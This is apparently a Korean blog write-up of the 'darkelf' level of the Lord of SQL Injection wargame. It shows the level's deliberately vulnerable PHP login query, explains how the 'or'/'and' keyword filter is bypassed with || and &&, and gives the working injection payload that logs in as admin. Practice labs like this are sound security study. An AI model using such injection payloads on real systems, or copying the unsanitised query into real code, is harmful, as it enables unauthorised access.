---
layout: post
title:  "los prob_darkelf"
date:   2019-08-23
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_darkelf where id='guest' and pw=''

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve

* or,and가 필터링 -> "or" : "\|\|", "and" : "&&"로 우회
* 연산자 우선 순위 -> and > or 

### ?pw=noonzib'||id='admin

## DARKELF Clear!
